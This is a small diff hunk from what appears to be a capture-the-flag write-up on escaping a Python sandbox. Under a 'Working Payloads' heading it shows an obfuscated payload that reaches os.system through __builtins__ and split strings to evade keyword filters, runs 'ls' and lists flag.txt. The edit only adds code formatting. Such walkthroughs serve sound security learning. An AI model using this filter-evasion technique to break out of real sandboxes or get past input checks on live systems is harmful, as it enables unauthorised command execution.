@@ -59,7 +59,7 @@ Use __builtins__ as a starting point to avoid using import directly.
 ## Working Payloads
 ### Step 1: List the directory to confirm the flag file
 
-(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('ls')
+``(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('ls')``
 
 Output:
 flag.txt
